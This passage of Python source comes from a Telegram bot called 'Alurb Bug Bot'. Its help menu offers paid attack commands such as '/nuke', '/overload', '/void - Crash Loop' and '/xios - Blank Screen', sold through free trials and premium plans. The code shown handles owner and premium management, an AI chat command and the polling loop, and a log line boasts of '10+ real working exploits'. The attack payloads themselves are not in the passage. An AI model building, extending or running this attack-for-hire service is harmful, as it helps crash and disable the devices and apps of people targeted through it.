/nuke - Full System Nuke
/killapp - Force Close Apps
/overload (1-15) - System Overload
/xdelay (ms) - Response Killer
/void (10-200) - Crash Loop
/xios (5-30) - Blank Screen

📊 <b>UTILITIES:</b>
/status - Bot status
/trial - Free trial
/premium - Upgrade
/stop - Stop attacks (owner)

━━━━━━━━━━━━━━━━━━━━━━
🎁 Free trial: /trial ({TRIAL_HOURS}h)
💎 Upgrade: /premium
    """
    bot.reply_to(message, help_text, parse_mode="HTML")

@bot.message_handler(commands=['ask'])
def ask_ai(message):
    user_id = str(message.from_user.id)
    
    try:
        parts = message.text.split(' ', 1)
        if len(parts) < 2:
            bot.reply_to(message, "❌ Usage: /ask (question)")
            return
        
        query = parts[1].strip()
        bot.send_chat_action(message.chat.id, 'typing')
        
        response = ai_chat(query)
        bot.reply_to(message, f"🤖 <b>Alurb AI:</b>\n\n{response}", parse_mode="HTML")
        
    except Exception as e:
        bot.reply_to(message, "❌ AI error")

@bot.message_handler(commands=['addowner'])
def add_owner(message):
    if not is_master(message.from_user.id):
        return
    
    try:
        target_id = message.text.split()[1]
        if target_id not in OWNERS and target_id != MASTER_OWNER_ID:
            OWNERS.append(target_id)
            save_data()
            bot.reply_to(message, f"✅ Owner added: {target_id}")
    except:
        bot.reply_to(message, "❌ Usage: /addowner (id)")

@bot.message_handler(commands=['delowner'])
def del_owner(message):
    if not is_master(message.from_user.id):
        return
    
    try:
        target_id = message.text.split()[1]
        if target_id in OWNERS:
            OWNERS.remove(target_id)
            save_data()
            bot.reply_to(message, f"✅ Owner removed: {target_id}")
    except:
        bot.reply_to(message, "❌ Usage: /delowner (id)")

@bot.message_handler(commands=['addprem'])
def add_premium(message):
    if not is_owner(message.from_user.id):
        return
    
    try:
        parts = message.text.split()
        target_id = parts[1]
        plan = parts[2] if len(parts) > 2 else "monthly"
        
        days = PREMIUM_PLANS.get(plan, PREMIUM_PLANS["monthly"])["days"]
        expiry = datetime.now() + timedelta(days=days) if plan != "lifetime" else None
        
        PREMIUM_USERS[target_id] = {
            "added_by": str(message.from_user.id),
            "expires": expiry.isoformat() if expiry else None,
            "plan": plan
        }
        save_data()
        bot.reply_to(message, f"✅ Premium added to {target_id}")
    except:
        bot.reply_to(message, "❌ Usage: /addprem (id) [daily/weekly/monthly/lifetime]")

@bot.message_handler(commands=['delprem'])
def del_premium(message):
    if not is_owner(message.from_user.id):
        return
    
    try:
        target_id = message.text.split()[1]
        if target_id in PREMIUM_USERS:
            del PREMIUM_USERS[target_id]
            save_data()
            bot.reply_to(message, f"✅ Premium removed from {target_id}")
    except:
        bot.reply_to(message, "❌ Usage: /delprem (id)")

@bot.message_handler(commands=['users'])
def users_list(message):
    if not is_owner(message.from_user.id):
        return
    
    users_text = "<b>📋 USERS LIST</b>\n\n"
    for i, (uid, data) in enumerate(list(USER_ACTIVITY.items())[:50], 1):
        status = "💎" if uid in PREMIUM_USERS else "🎁" if is_trial_active(uid) else "👤"
        users_text += f"{i}. {status} {uid} - @{data.get('username', 'unknown')}\n"
    
    bot.reply_to(message, users_text, parse_mode="HTML")

# ==================== MAIN RUNNER ====================

def run_bot():
    logger.info("🚀 STARTING ALURB BUG BOT")
    logger.info(f"👑 Master: {MASTER_OWNER_ID}")
    logger.info(f"💀 Bug commands loaded: 10+ real working exploits")
    
    while True:
        try:
            bot.infinity_polling(timeout=30, long_polling_timeout=30)
        except Exception as e:
            logger.error(f"Bot error: {e}")
            time.sleep(10)

if __name__ == "__main__":
    try:
        run_bot()
    except KeyboardInterrupt:
        logger.info("Bot stopped")
    except Exception as e:
        logger.critical(f"Fatal error: {e}")
